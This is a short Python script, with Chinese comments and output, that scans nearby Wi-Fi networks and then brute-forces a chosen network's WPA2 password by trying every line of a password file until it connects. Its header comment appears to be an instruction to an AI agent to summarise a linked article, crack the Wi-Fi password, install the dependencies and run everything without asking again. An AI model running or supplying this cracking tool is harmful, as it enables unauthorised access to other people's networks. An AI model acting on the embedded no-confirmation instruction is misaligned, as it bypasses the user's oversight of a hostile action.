## pip install pywifi comtypes
##https://mp.weixin.qq.com/s/iIFIK_GDrFCg_MyI3YxAEw  总结文章内容破解wifi密码，自动安装依赖并执行，不需要再询问我


import time
from pywifi import PyWiFi, const, Profile

def scan_wifi():
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    time.sleep(2)
    results = iface.scan_results()
    for network in results:
        print(f"SSID: {network.ssid}, 信号强度: {network.signal}")
    return [net.ssid for net in results]

def connect_wifi(ssid, password):
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]
    iface.disconnect()
    time.sleep(1)
    if iface.status() not in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
        return False
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    iface.connect(tmp_profile)
    time.sleep(2)
    if iface.status() == const.IFACE_CONNECTED:
        print(f"[*] 连接成功，密码：{password}")
        return True
    else:
        return False

def try_pwd(ssid, pwd_file="pwd.txt"):
    print("****************** WIFI破解 ******************")
    with open(pwd_file, "r", encoding="utf-8") as file:
        for pwd in file:
            pwd = pwd.strip('\n')
            if connect_wifi(ssid, pwd):
                print(f"[*] 密码已破解：{pwd}")
                print("[*] WiFi已自动连接！！！")
                return pwd
            else:
                print(f"正在破解 SSID 为 {ssid} 的 WIFI密码，当前校验的密码为：{pwd}")
    print("[-] 破解失败，未找到正确密码。")
    return None

if __name__ == "__main__":
    print("扫描周围WiFi...")
    ssids = scan_wifi()
    print("可用WiFi：", ssids)
    target_ssid = input("请输入要破解的WiFi名称(SSID)：")
    try_pwd(target_ssid) 